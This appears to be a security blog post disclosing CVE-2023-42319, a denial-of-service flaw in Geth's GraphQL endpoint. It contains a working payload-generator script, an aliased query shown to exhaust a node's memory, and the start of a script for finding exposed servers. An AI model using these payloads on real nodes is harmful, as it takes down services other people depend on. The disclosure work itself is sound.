<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>CVE-2023-42319 : Geth - DoS through GraphQL - MevSec</title><meta name=Description content="CVE-2023-42319 : Geth - Denial Of Service through the GraphQL endpoint"><meta property="og:title" content="CVE-2023-42319 : Geth - DoS through GraphQL"><meta property="og:description" content="CVE-2023-42319 : Geth - Denial Of Service through the GraphQL endpoint"><meta property="og:type" content="article"><meta property="og:url" content="/posts/geth-dos-with-graphql/"><meta property="og:image" content="/posts/geth-dos-with-graphql/templatebloggraphqldos.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-10-15T00:00:00+00:00"><meta property="article:modified_time" content="2023-10-15T00:00:00+00:00"><meta property="og:site_name" content="MevSec Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/posts/geth-dos-with-graphql/templatebloggraphqldos.png"><meta name=twitter:title content="CVE-2023-42319 : Geth - DoS through GraphQL"><meta name=twitter:description content="CVE-2023-42319 : Geth - Denial Of Service through the GraphQL endpoint"><meta name=application-name content="MevSec's blog"><meta name=apple-mobile-web-app-title content="MevSec's blog"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=/posts/geth-dos-with-graphql/><link rel=prev href=/posts/mevsec-introduction/><link rel=next href=/posts/wormhole-ccq-rest-api-dos/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=/lib/fontawesome-free/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/fontawesome-free/all.min.css></noscript><link rel=preload href=/lib/animate/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/animate/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"CVE-2023-42319 : Geth - DoS through GraphQL","inLanguage":"en-us","mainEntityOfPage":{"@type":"WebPage","@id":"\/posts\/geth-dos-with-graphql\/"},"image":[{"@type":"ImageObject","url":"\/posts\/geth-dos-with-graphql\/templatebloggraphqldos.png","width":1703,"height":512}],"genre":"posts","keywords":"Geth, DoS, GraphQL","wordcount":1555,"url":"\/posts\/geth-dos-with-graphql\/","datePublished":"2023-10-15T00:00:00+00:00","dateModified":"2023-10-15T00:00:00+00:00","publisher":{"@type":"Organization","name":"fadam"},"author":{"@type":"Person","name":"fadam"},"description":"CVE-2023-42319 : Geth - Denial Of Service through the GraphQL endpoint"}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":""==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:""==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=MevSec>MevSec</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>Posts </a><a class=menu-item href=/categories/>Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span>
</span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=MevSec>MevSec</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Search titles or contents..." id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/categories/ title>Categories</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class="toc-content always-active" id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">CVE-2023-42319 : Geth - DoS through GraphQL</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>fadam</a></span>&nbsp;<span class=post-category>included in <a href=/categories/web2/><i class="far fa-folder fa-fw" aria-hidden=true></i>Web2</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2023-10-15>2023-10-15</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;1555 words&nbsp;
<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;8 minutes&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>Contents</span>
<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#1-introduction>1. Introduction</a></li><li><a href=#2-graphql-batch-of-requests-with-aliases>2. GraphQL batch of requests with aliases</a></li><li><a href=#3-exploitation>3. Exploitation</a></li><li><a href=#4-vulnerable-servers-in-the-wild>4. Vulnerable servers in the wild</a></li><li><a href=#5-ethereum-response>5. Ethereum response</a></li></ul></nav></div></div><div class=content id=content><h2 id=1-introduction>1. Introduction</h2><p><a href=https://geth.ethereum.org/ target=_blank rel="noopener noreffer">go-ethereum</a> (Geth) is the most deployed Execution Layer for Ethereum.</p><p>GraphQL is a query language for APIs, commonly seen in Web2 applications querying the blockchain.</p><p><strong>Geth</strong> proposes a GraphQL endpoint that can be activated by adding the option <strong>&ndash;http &ndash;graphql</strong> when starting the service.</p><p>However, this component is buggy and subject to Denial Of Service because:</p><ul><li>It consumes a lot of resources.</li><li>It is possible to perform unlimited GraphQL requests within a single HTTP request.</li></ul><p>The present research was conducted in during the month of June/July 2023, with the issue being sent to Geth team on July 4th 2023.</p><h2 id=2-graphql-batch-of-requests-with-aliases>2. GraphQL batch of requests with aliases</h2><p>When GraphQL endpoint is activated, a new path is available on the RPC server showing a GraphQL interface: <strong>http://[@IP]:8545/graphql/ui</strong></p><p>Here is an example of a GraphQL query sent from the interface, to retrieve the current block number:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/posts/geth-dos-with-graphql/1-simple-query.png data-srcset="/posts/geth-dos-with-graphql/1-simple-query.png, /posts/geth-dos-with-graphql/1-simple-query.png 1.5x, /posts/geth-dos-with-graphql/1-simple-query.png 2x" data-sizes=auto alt=/posts/geth-dos-with-graphql/1-simple-query.png title="Simple GraphQL query" width=1057 height=211></p><p>The format of the GraphQL query is :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>query blockInfo() {
</span></span><span class=line><span class=cl>    block() {
</span></span><span class=line><span class=cl>      number
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><p>Behind the scenes, when a GraphQL request is performed, the GraphQL request is encapsulated within a HTTP request :</p><p align=center><img alt="Single HTTP/GraphQL request" src=2-http-1-graphql.png width=50% height=50%></p><p>The concept of GraphQL aliases is to put multiple GraphQL queries within a simple HTTP request, like in the picture below:</p><p align=center><img alt="Batch of GraphQL requests" src=3-http-batch.png width=50% height=50%></p><p>In terms of GraphQL syntax, it looks like this:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>query{
</span></span><span class=line><span class=cl>	req01: block() {
</span></span><span class=line><span class=cl>		number
</span></span><span class=line><span class=cl>	}
</span></span><span class=line><span class=cl>	req02: block() {
</span></span><span class=line><span class=cl>		number
</span></span><span class=line><span class=cl>	}
</span></span><span class=line><span class=cl>	req03: block() {
</span></span><span class=line><span class=cl>		number
</span></span><span class=line><span class=cl>	}
</span></span><span class=line><span class=cl>	req04: block() {
</span></span><span class=line><span class=cl>		number
</span></span><span class=line><span class=cl>	}
</span></span><span class=line><span class=cl>	req05: block() {
</span></span><span class=line><span class=cl>		number
</span></span><span class=line><span class=cl>	}
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><p>The result of such a request is that the server will <strong>treat each GraphQL query individually</strong>, and return them within the same HTTP response.</p><p><figure><a class=lightgallery href=/posts/geth-dos-with-graphql/4-http-batch-result.png title="Batch result" data-thumbnail=/posts/geth-dos-with-graphql/4-http-batch-result.png data-sub-html="<h2>Batch Result From the GraphQL console</h2><p>Batch result</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/posts/geth-dos-with-graphql/4-http-batch-result.png data-srcset="/posts/geth-dos-with-graphql/4-http-batch-result.png, /posts/geth-dos-with-graphql/4-http-batch-result.png 1.5x, /posts/geth-dos-with-graphql/4-http-batch-result.png 2x" data-sizes=auto alt=/posts/geth-dos-with-graphql/4-http-batch-result.png width=1086 height=459></a><figcaption class=image-caption>Batch Result From the GraphQL console</figcaption></figure></p><p>This means that someone can ask the server to perform hundreds, even thousands of GraphQL operations <strong>within a single HTTP request</strong>, which can lead to resource exhaustion, therefore causing a <strong>Denial Of Service</strong>.</p><h2 id=3-exploitation>3. Exploitation</h2><p>When the GraphQL service is enabled on Geth, it is possible to retrieve all the possible requests and arguments of GraphQL by performing the GraphQL <strong>introspection query</strong>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
</span></span></code></pre></td></tr></table></div></div><p>This request returns a large JSON, that can be uploaded on a website like <a href=https://graphql-kit.com/graphql-voyager/ target=_blank rel="noopener noreffer">GraphQL Voyager</a>, or simply put in the <strong>InQL Scanner</strong> module for analysis:</p><p><figure><a class=lightgallery href=/posts/geth-dos-with-graphql/5-inQL.png title="inQL Burp extension" data-thumbnail=/posts/geth-dos-with-graphql/5-inQL.png data-sub-html="<h2>BurpSuite InQL Scanner</h2><p>inQL Burp extension</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/posts/geth-dos-with-graphql/5-inQL.png data-srcset="/posts/geth-dos-with-graphql/5-inQL.png, /posts/geth-dos-with-graphql/5-inQL.png 1.5x, /posts/geth-dos-with-graphql/5-inQL.png 2x" data-sizes=auto alt=/posts/geth-dos-with-graphql/5-inQL.png width=1122 height=293></a><figcaption class=image-caption>BurpSuite InQL Scanner</figcaption></figure></p><p><u>Note:</u> since Geth is public, it is also possible to retrieve this information from the <a href=https://github.com/ethereum/go-ethereum/blob/master/graphql/schema.go target=_blank rel="noopener noreffer">source code</a>.</p><p>By analyzing the results, the <strong>logs</strong> query is interesting because the filter <strong>fromBlock</strong> means that the server would have to recompute, for each GraphQL query, all the logs from the mentioned block.This <strong>seems expensive in terms of resources</strong>.</p><p>Using aliases for this query would look like this :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>query {
</span></span><span class=line><span class=cl>    request1: logs(filter: { fromBlock: 4188901 }) {
</span></span><span class=line><span class=cl>      data
</span></span><span class=line><span class=cl>      topics
</span></span><span class=line><span class=cl>      index
</span></span><span class=line><span class=cl>      transaction {
</span></span><span class=line><span class=cl>        gas
</span></span><span class=line><span class=cl>      }
</span></span><span class=line><span class=cl>      account(block: Long) {
</span></span><span class=line><span class=cl>        address
</span></span><span class=line><span class=cl>      }
</span></span><span class=line><span class=cl>(...)
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>    request99: logs(filter: { fromBlock: 4188999 }) {
</span></span><span class=line><span class=cl>      data
</span></span><span class=line><span class=cl>      topics
</span></span><span class=line><span class=cl>      index
</span></span><span class=line><span class=cl>      transaction {
</span></span><span class=line><span class=cl>        gas
</span></span><span class=line><span class=cl>      }
</span></span><span class=line><span class=cl>      account(block: Long) {
</span></span><span class=line><span class=cl>        address
</span></span><span class=line><span class=cl>      }
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><p>The following python script can be used to generate a payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#Usage: python3 generate.py block_start alias_number</span>
</span></span><span class=line><span class=cl><span class=c1>#Example: python3 generate.py 4188927 100</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>argparse</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>generate_payload</span><span class=p>(</span><span class=n>start_block</span><span class=p>,</span> <span class=n>num_aliases</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;query {</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>num_aliases</span> <span class=o>+</span> <span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>request_name</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;req</span><span class=si>{</span><span class=n>i</span><span class=si>:</span><span class=s2>02d</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>from_block</span> <span class=o>=</span> <span class=n>start_block</span> <span class=o>+</span> <span class=n>i</span> <span class=o>-</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>+=</span> <span class=sa>f</span><span class=s2>&#34;  </span><span class=si>{</span><span class=n>request_name</span><span class=si>}</span><span class=s2>: logs(filter: </span><span class=se>{{</span><span class=s2> fromBlock: </span><span class=si>{</span><span class=n>from_block</span><span class=si>}</span><span class=s2> </span><span class=se>}}</span><span class=s2>) </span><span class=se>{{\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;    data</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;    topics</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;    index</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;    transaction {</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;      gas</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;    }</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;    account(block: Long) {</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;      address</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;    }</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;  }</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=s2>&#34;}</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>payload</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span> <span class=o>=</span> <span class=n>argparse</span><span class=o>.</span><span class=n>ArgumentParser</span><span class=p>(</span><span class=n>description</span><span class=o>=</span><span class=s2>&#34;Generate a JSON payload for aliases&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&#34;start_block&#34;</span><span class=p>,</span> <span class=nb>type</span><span class=o>=</span><span class=nb>int</span><span class=p>,</span> <span class=n>help</span><span class=o>=</span><span class=s2>&#34;Start block number&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&#34;num_aliases&#34;</span><span class=p>,</span> <span class=nb>type</span><span class=o>=</span><span class=nb>int</span><span class=p>,</span> <span class=n>help</span><span class=o>=</span><span class=s2>&#34;Number of aliases&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>args</span> <span class=o>=</span> <span class=n>parser</span><span class=o>.</span><span class=n>parse_args</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>generate_payload</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>start_block</span><span class=p>,</span> <span class=n>args</span><span class=o>.</span><span class=n>num_aliases</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;payload.json&#34;</span><span class=p>,</span> <span class=s2>&#34;w&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>json_file</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>json_file</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>This will generate a payload.json file that can be sent through the GraphQL interface :</p><p><figure><a class=lightgallery href=/posts/geth-dos-with-graphql/6-geth-graphiql.png title="Exploitation with GraphiQL" data-thumbnail=/posts/geth-dos-with-graphql/6-geth-graphiql.png data-sub-html="<h2>GraphQL Console</h2><p>Exploitation with GraphiQL</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/posts/geth-dos-with-graphql/6-geth-graphiql.png data-srcset="/posts/geth-dos-with-graphql/6-geth-graphiql.png, /posts/geth-dos-with-graphql/6-geth-graphiql.png 1.5x, /posts/geth-dos-with-graphql/6-geth-graphiql.png 2x" data-sizes=auto alt=/posts/geth-dos-with-graphql/6-geth-graphiql.png width=1087 height=492></a><figcaption class=image-caption>GraphQL Console</figcaption></figure></p><p>The tests were performed on a Sepolia full node, with 16Gb of RAM memory.</p><p>The node was synced, Consensus client was prysm. Nothing else was running on the server. Geth version used is the latest stable at the time : <strong>1.12.2-stable-bed84606</strong>.</p><p>The <a href="https://drive.google.com/file/d/12CnXF2nHxF9j6IuiaeZUMIJw_EcoKuXy/view?usp=sharing" target=_blank rel="noopener noreffer">first video</a> shows that the node is living his life peacefully and is using 1.1Gb of RAM memory.</p><p>Then, at 00:10 the following GraphQL request was sent:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>query {
</span></span><span class=line><span class=cl>    request1: logs(filter: { fromBlock: 4188927 }) {
</span></span><span class=line><span class=cl>      data
</span></span><span class=line><span class=cl>      topics
</span></span><span class=line><span class=cl>      index
</span></span><span class=line><span class=cl>      transaction {
</span></span><span class=line><span class=cl>        gas
</span></span><span class=line><span class=cl>      }
</span></span><span class=line><span class=cl>      account(block: Long) {
</span></span><span class=line><span class=cl>        address
</span></span><span class=line><span class=cl>      }
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>    request2: logs(filter: { fromBlock: 4088927 }) {
</span></span><span class=line><span class=cl>      data
</span></span><span class=line><span class=cl>      topics
</span></span><span class=line><span class=cl>      index
</span></span><span class=line><span class=cl>      transaction {
</span></span><span class=line><span class=cl>        gas
</span></span><span class=line><span class=cl>      }
</span></span><span class=line><span class=cl>      account(block: Long) {
</span></span><span class=line><span class=cl>        address
</span></span><span class=line><span class=cl>      }
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><p>This single HTTP request is performing <strong>only 2 GraphQL requests</strong> with aliases.</p><p>When the request is fired, you can see:</p><ol><li>At 00:40, the RAM memory went up to 9,4Gb of RAM (+8.3Gb for 2 GraphQL requests)</li><li>At the same time, request timeout on Web browser after 30 seconds (00:10 + 30 seconds)</li><li>However, memory went up to 10.6Gb and did not decrease for at least the remaining two minutes (sometimes, it decreases back to normal after 60 seconds but behavior is inconsistent).</li></ol><p>With a simple request with 2 aliases, the Geth server is suffering.</p><p>Then to crash the node entirely, you can just add more queries (10 aliases), as shown in the <a href="https://drive.google.com/file/d/1dvgGe13yYQv1Ut34plof1b3OAeaD91gi/view?usp=sharing" target=_blank rel="noopener noreffer">following video</a> where the node gets unresponsive after it reaches its RAM maximum (12.4Gb after 00:35).</p><h2 id=4-vulnerable-servers-in-the-wild>4. Vulnerable servers in the wild</h2><p>By using Shodan, looking for Geth servers having port 8445 port opened, it is possible to find a bit more than 8000 servers with Geth exposed. Among those, over 80 had the vulnerable GraphQL endpoint exposed.</p><p>The script below was used to identify vulnerable servers among the 8000 ones:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>threading</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Input file containing IP addresses from Shodan</span>
</span></span><span class=line><span class=cl><span class=n>input_file</span> <span class=o>=</span> <span class=s2>&#34;input.txt&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Output file to save GraphQL URIs</span>
</span></span><span class=line><span class=cl><span class=n>output_file</span> <span class=o>=</span> <span class=s2>&#34;graphql_uris.txt&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Function to check an IP address and save GraphQL URIs</span>
